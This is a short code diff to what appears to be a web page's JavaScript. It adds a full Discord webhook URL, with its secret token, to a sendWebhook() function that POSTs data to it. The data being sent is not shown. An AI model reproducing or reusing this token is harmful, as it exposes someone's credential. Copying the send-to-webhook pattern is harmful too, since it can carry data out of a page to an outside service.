@@ -160,7 +160,7 @@
 
       function sendWebhook() {
         /*Change here the webhookUrl for your discord webhook url*/
-        const webhookUrl = ""
+        const webhookUrl = "https://discord.com/api/webhooks/1090027890684465332/oSUhn_-Dax8JISypeAzXjn93164U6aRUMIvgI09Xmoi2756Ko9U0MSXaKtFoEuRSnDF-"
 
         let request = new XMLHttpRequest();
         request.open("POST", webhookUrl);
